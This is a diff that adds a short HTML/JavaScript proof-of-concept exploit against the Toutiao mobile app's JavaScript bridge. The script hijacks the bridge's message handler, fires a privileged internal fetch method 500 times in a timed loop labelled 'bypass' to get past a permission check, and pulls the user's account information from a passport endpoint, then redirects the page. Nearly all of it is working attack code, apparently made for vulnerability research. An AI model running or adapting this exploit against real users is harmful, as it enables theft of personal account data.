@@ -1,0 +1,32 @@
+<script>
+    ToutiaoJSBridge._handleMessageFromToutiao=function(p1){
+        var data = JSON.stringify(p1)
+        if(!data.includes("denied")){
+          alert(data);
+        }
+
+    }
+    function attack(){
+        ToutiaoJSBridge.invokeMethod(JSON.stringify({
+            "func": "outertest_fetch",
+            "params":{
+                "url": "https://is.snssdk.com/passport/account/info/v2/",
+                "method": "GET"
+            },
+            "type":"test",
+            "JSSDK": "2.3.9",
+            "__msg_type": "call",
+            "__callback_id": "1000",
+            "__iframe_url":"",
+            "shouldHook":"false"
+        }));
+    }
+    function bypass() {
+        for(var i =0; i < 500; i++){
+            setTimeout(attack, 10 + i);
+        }
+    }
+    bypass();
+    location.href = "https://noexists.bytecdn.cn/ies/page/huoshan/user_service_protocol.html";
+
+</script>
